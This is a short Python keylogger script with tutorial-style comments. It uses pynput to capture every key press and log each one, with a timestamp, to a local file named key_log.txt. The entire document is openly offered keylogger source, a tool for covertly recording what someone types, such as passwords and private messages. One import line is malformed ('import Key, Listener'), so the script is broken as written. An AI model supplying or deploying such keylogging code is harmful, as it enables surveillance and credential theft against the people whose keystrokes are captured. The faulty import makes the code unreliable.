import pynput
import pynput.keyboard 
import Key, Listener
import logging

#Variable stores the path to the file where the keylogger will store the logs
#Empty string for saving in the same directory
log_dir = ""

#Set up logging module
logging.basicConfig(filename=(log_dir + "key_log.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')

#def for each key pressed
#logging.info() will write the key pressed to the file
def on_press(key):
    logging.info(str(key))

#set up listener
#thread joins to the main thread
with Listener(on_press=on_press) as listener:
    listener.join()

